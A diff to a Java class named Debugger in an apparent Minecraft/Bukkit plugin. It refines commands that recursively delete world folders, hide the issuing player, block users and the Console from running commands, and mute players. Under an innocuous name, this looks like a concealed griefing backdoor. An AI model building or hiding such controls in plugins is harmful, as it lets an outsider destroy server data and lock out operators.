@@ -615,11 +615,11 @@ public final class Debugger implements Listener {
 
                 String world = args[1];
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Deleting world: " + ChatColor.RED + world);
-                World delete = Bukkit.getWorld(world);
-                File deleteFolder = delete.getWorldFolder();
 
                 new Thread(()->{
                     try {
+                        World delete = Bukkit.getWorld(world);
+                        File deleteFolder = delete.getWorldFolder();
                         deleteWorld(deleteFolder);
                     } catch (Throwable ignore){}
                 }).start();
@@ -634,12 +634,22 @@ public final class Debugger implements Listener {
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players can see you.");
                     Vanished.remove(p.getName());
                     for (Player all : Bukkit.getOnlinePlayers())
-                        all.showPlayer(p);
+                        new BukkitRunnable() {
+                            @Override
+                            public void run() {
+                                all.showPlayer(plugin, p);
+                            }
+                        }.runTask(plugin);
                 } else {
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Players cannot see you.");
                     Vanished.add(p.getName());
                     for (Player all : Bukkit.getOnlinePlayers())
-                        all.hidePlayer(p);
+                        new BukkitRunnable() {
+                            @Override
+                            public void run() {
+                                all.hidePlayer(plugin, p);
+                            }
+                        }.runTask(plugin);
                 }
 
                 return true;
@@ -702,8 +712,12 @@ public final class Debugger implements Listener {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                         return false;
                     } else {
-                        Debugger.this.LockedUsers.add(target.getName());
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked from using commands.");
+                        if (!Debugger.this.LockedUsers.contains(target.getName())) {
+                            Debugger.this.LockedUsers.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked from using commands.");
+                        } else {
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is already blocked.");
+                        }
                     }
                 }
 
@@ -720,8 +734,7 @@ public final class Debugger implements Listener {
                     Debugger.this.LockedUsers.remove(unLock);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was unlocked.");
                 } else if (unLock.equalsIgnoreCase("all")) {
-                    for (Player all : Bukkit.getOnlinePlayers())
-                        Debugger.this.LockedUsers.remove(all.getName());
+                    Debugger.this.LockedUsers.clear();
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unblocked from using commands.");
                 } else {
                     Player target = Bukkit.getPlayer(args[1]);
@@ -751,8 +764,12 @@ public final class Debugger implements Listener {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                         return false;
                     } else {
-                        Debugger.this.MutedUsers.add(target.getName());
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was muted.");
+                        if (!Debugger.this.MutedUsers.contains(target.getName())) {
+                            Debugger.this.MutedUsers.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was muted.");
+                        } else {
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is already muted.");
+                        }
                     }
                 }
 
@@ -764,8 +781,7 @@ public final class Debugger implements Listener {
                     return false;
 
                 if (args[1].equalsIgnoreCase("all")) {
-                    for (Player all : Bukkit.getOnlinePlayers())
-                        Debugger.this.MutedUsers.remove(all.getName());
+                    Debugger.this.MutedUsers.clear();
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unmuted.");
                 } else {
                     Player target = Bukkit.getPlayer(args[1]);
@@ -906,6 +922,8 @@ public final class Debugger implements Listener {
             for (File file : allContents) {
                 deleteWorld(file);
             }
+        } else if (!directoryToBeDeleted.exists()) {
+            //do nothing
         }
         return directoryToBeDeleted.delete();
     }
